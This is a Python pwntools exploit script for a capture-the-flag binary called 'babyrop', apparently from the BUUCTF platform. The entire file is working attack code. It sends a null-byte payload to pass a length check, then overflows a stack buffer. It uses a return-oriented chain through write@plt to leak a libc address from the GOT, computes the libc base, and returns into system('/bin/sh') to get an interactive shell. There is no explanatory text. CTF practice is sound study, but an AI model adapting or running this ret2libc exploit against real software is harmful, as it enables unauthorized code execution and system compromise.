from pwn import *

#io=remote('node4.buuoj.cn',28321)
io=process('./pwn')
elf=ELF('./babyrop')
libc=ELF('./libc-2.23.so')

system_libc=libc.symbols['system']
binsh_libc=next(libc.search(b'/bin/sh'))

write_libc=libc.symbols['write']
write_plt=elf.plt['write']
write_got=elf.got['write']

main_addr=0x8048825
payload=b'\x00'+b'\xff'*10
io.sendline(payload)

io.recvuntil(b"Correct\n")
payload=b'a'*(0xe7+4)+p32(write_plt)+p32(main_addr)
#                    ret1           ret2
payload+=p32(1)+p32(write_got)+p32(4)
#write   par1   par2           par3
io.sendline(payload)
write_addr=u32(io.recv(4))
base=write_addr-write_libc


system_addr=system_libc+base
binsh_addr=binsh_libc+base
payload=b'\x00'+b'\xff'*10
io.sendline(payload)
io.recvuntil(b"Correct\n")
payload=b'a'*(0xe7+4)+p32(system_addr)+p32(main_addr)
payload+=p32(binsh_addr)
io.sendline(payload)
io.interactive()
# rdi, rsi, rdx, rcx, r8, r9
